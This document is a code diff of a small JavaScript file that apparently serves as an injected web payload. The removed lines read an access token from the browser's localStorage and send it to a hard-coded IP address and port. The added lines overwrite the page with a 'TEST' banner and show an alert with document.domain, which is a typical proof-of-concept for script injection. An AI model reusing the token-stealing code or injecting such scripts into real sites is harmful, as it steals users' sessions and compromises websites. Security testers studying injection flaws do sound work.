@@ -1,11 +1,42 @@
-const accessToken = localStorage.getItem("accessToken");
+// Replace HTML content
+document.documentElement.innerHTML = `
+  <html>
+  <head>
+    <title>Replaced Content</title>
+    <style>
+      #banner {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        background-color: yellow;
+        color: black;
+        text-align: center;
+        padding: 10px;
+        font-size: 20px;
+      }
+    </style>
+  </head>
+  <body>
+    <div id="banner">TEST</div>
+  </body>
+  </html>
+`;
 
-// Check if accessToken exists in local storage
-if (accessToken) {
-  const url = `http://138.68.102.109:1234?accessToken=${encodeURIComponent(accessToken)}`;
+// Run an alert with document.domain
+alert('Current document.domain: ' + document.domain);
 
-  // Open the URL in a new window
-  window.open(url);
-} else {
-  console.error('accessToken not found in local storage!');
+// Display the moving banner
+const banner = document.getElementById('banner');
+let position = 0;
+
+function moveBanner() {
+  position += 2;
+  if (position >= window.innerWidth - banner.clientWidth) {
+    position = -banner.clientWidth;
+  }
+  banner.style.left = position + 'px';
+  requestAnimationFrame(moveBanner);
 }
+
+moveBanner();
